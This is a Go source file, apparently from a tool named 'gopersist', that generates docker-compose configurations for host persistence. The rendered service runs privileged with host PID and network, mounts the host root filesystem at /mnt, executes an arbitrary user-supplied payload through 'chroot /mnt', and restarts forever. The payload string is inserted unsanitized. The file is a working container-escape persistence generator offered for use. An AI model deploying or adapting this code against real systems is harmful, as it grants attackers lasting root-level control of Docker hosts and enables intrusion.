package dockercompose

import (
	"bytes"
	"errors"
	"fmt"
	"strings"
)

// ConfigParams captures the inputs for rendering a docker-compose file that
// launches a privileged container and executes a payload from the host.
type ConfigParams struct {
	// ServiceName is used for both the docker compose service and container name.
	ServiceName string
	// Image is the container image to launch (e.g., alpine:latest).
	Image string
	// PayloadCommand is executed on the host after mounting / via chroot.
	PayloadCommand string
}

// Validate ensures the required parameters are present and safe for rendering.
func (p ConfigParams) Validate() error {
	if strings.TrimSpace(p.ServiceName) == "" {
		return errors.New("ServiceName is required")
	}
	if !isValidServiceName(p.ServiceName) {
		return fmt.Errorf("ServiceName %q must contain only letters, numbers, dashes, or underscores", p.ServiceName)
	}
	if strings.TrimSpace(p.Image) == "" {
		return errors.New("Image is required")
	}
	if strings.TrimSpace(p.PayloadCommand) == "" {
		return errors.New("PayloadCommand is required")
	}
	return nil
}

// RenderConfig produces a docker-compose YAML configuration based
// on the provided parameters. The rendered compose file launches the requested image in 
// privileged mode, mounts the host root filesystem at
// /mnt, and executes the payload via "chroot /mnt" 
func RenderConfig(p ConfigParams) (string, error) {
	if err := p.Validate(); err != nil {
		return "", err
	}

	var b bytes.Buffer
	b.WriteString("# gopersist-generated docker-compose configuration\n")
	b.WriteString("version: \"3.9\"\n")
	b.WriteString("services:\n")
	fmt.Fprintf(&b, "  %s:\n", p.ServiceName)
	fmt.Fprintf(&b, "    container_name: %s\n", p.ServiceName)
	fmt.Fprintf(&b, "    image: %s\n", p.Image)
	b.WriteString("    privileged: true\n")
	b.WriteString("    pid: \"host\"\n")
	b.WriteString("    network_mode: \"host\"\n")
	b.WriteString("    volumes:\n")
	b.WriteString("      - \"/:/mnt\"\n")
	b.WriteString("    command:\n")
	b.WriteString("      - /bin/sh\n")
	b.WriteString("      - -c\n")
	fmt.Fprintf(&b, "      - chroot /mnt %s\n", p.PayloadCommand)
	b.WriteString("    restart: \"always\"\n")

	return b.String(), nil
}

func isValidServiceName(name string) bool {
	if name == "" {
		return false
	}
	for _, r := range name {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
			continue
		}
		return false
	}
	return true
}
